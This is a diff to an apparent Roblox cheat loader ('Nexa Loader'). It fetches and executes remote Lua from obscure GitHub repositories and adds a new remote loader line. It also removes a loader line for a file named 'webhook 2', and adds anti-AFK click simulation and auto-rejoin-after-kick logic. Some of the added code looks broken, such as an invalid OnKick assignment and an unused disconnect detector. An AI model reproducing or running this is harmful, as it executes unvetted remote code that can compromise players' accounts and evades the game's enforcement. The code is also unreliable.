@@ -1,6 +1,6 @@
+
 local WindUI = loadstring(game:HttpGet("https://raw.githubusercontent.com/Footagesus/WindUI/main/dist/main.lua"))()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/fewnbhefbevfhevfdfveh/ckhsuciceifgeufhefveyfg/refs/heads/main/fhffgufGUIPRIVat"))()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/hdgsydgdgdy1233/Loaderlua/refs/heads/main/webhook%202"))()
 
 --[[
  _   _ _______ __   __    _    
@@ -92,3 +92,104 @@ else
     NotifyWindUI("Nexa Loader", "Unsupported game (PlaceId: " .. tostring(placeId) .. ")", 6)
     warn("Unsupported game. PlaceId:", placeId)
 end
+
+-- =======================
+-- AntiAFK Safe Auto-ON
+-- =======================
+local Players = game:GetService("Players")
+local VirtualUser = game:GetService("VirtualUser")
+local player = Players.LocalPlayer
+
+local AntiAFKEnabled = true
+local AntiAFKConnection
+local loopThread
+
+local function doVirtualAction()
+    VirtualUser:CaptureController()
+    VirtualUser:ClickButton2(Vector2.new(math.random(0,800), math.random(0,600)))
+    task.wait(0.05)
+    VirtualUser:ClickButton2(Vector2.new(math.random(0,800), math.random(0,600)))
+end
+
+local function startLoop()
+    loopThread = coroutine.create(function()
+        while AntiAFKEnabled do
+            pcall(doVirtualAction)
+            local waitTime = math.random(60, 300) -- interval acak 1-5 menit
+            local elapsed = 0
+            while elapsed < waitTime and AntiAFKEnabled do
+                task.wait(1)
+                elapsed += 1
+            end
+        end
+    end)
+    coroutine.resume(loopThread)
+end
+
+AntiAFKConnection = player.Idled:Connect(function()
+    if AntiAFKEnabled then
+        pcall(doVirtualAction)
+    end
+end)
+
+startLoop()
+
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Gato290/Script/refs/heads/main/ha"))()
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+
+-- Simpan PlaceId dan JobId server saat ini
+local placeId = game.PlaceId
+local jobId = game.JobId
+
+-- Delay sebelum mencoba reconnect (detik)
+local RECONNECT_DELAY = 5
+
+-- Fungsi reconnect
+local function reconnect()
+    print("Mencoba reconnect ke server yang sama...")
+    pcall(function()
+        TeleportService:TeleportToPlaceInstance(placeId, jobId, player)
+    end)
+end
+
+-- Detect kicked event
+player.OnKick = function(reason)
+    print("Kicked dari server! Alasan: " .. tostring(reason))
+    wait(RECONNECT_DELAY)
+    reconnect()
+end
+
+-- Detect disconnection/crash menggunakan Heartbeat
+local function detectDisconnect()
+    local lastTime = tick()
+    RunService.Heartbeat:Connect(function()
+        lastTime = tick()
+    end)
+end
+
+-- Fungsi utama: Auto reconnect
+local function autoReconnect()
+    -- Jika DC karena koneksi lost
+    local success, result = pcall(function()
+        while true do
+            if not player.Parent then
+                print("Player disconnected, mencoba reconnect...")
+                wait(RECONNECT_DELAY)
+                reconnect()
+                break
+            end
+            wait(1)
+        end
+    end)
+    if not success then
+        warn("Error autoReconnect: " .. tostring(result))
+    end
+end
+
+-- Jalankan auto reconnect
+autoReconnect()
